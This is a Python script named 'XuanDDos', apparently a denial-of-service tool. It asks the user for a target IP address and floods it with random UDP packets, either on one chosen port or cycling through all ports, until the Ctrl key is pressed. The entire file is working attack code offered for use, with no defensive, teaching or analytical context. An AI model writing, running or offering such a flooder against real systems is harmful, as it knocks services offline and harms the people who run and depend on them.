import sys
import os
import time
import socket
import random
import keyboard
print("XuanDDos")
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
ip = input("Target IP:")
while True:
    ModeChoose = input("Enabling All-Port Attack Mode (YES/NO):")
    if ModeChoose == "YES":
        AttackMode = "AllPort"
        break
    elif ModeChoose == "NO":
        AttackMode = "OnePort"
        OP = int(input("Please enter the port you want to attack:"))
        OPstr = str(OP)
        break
port = 1
sent = 0
print("Press the ESC key to start DDos, and press the ctrl key to stop DDos")
keyboard.wait("esc")
if AttackMode == "AllPort":
    while True:
        sock.sendto(bytes,(ip,port))
        sent = sent + 1
        SentStr = str(sent)
        port = port + 1
        PortStr = str(port-1)
        print(SentStr+" attack on"+ip+",the current attack port:"+PortStr)
        if port == 65534:
             port = 1
        if keyboard.is_pressed("ctrl") == True:
            break
elif AttackMode == "OnePort":
    while True:
        sock.sendto(bytes,(ip,OP))
        sent = sent + 1
        SentStr = str(sent)
        print(SentStr+" attack on"+ip+",the current attack port:"+OPstr)
        if keyboard.is_pressed("ctrl") == True:
            break
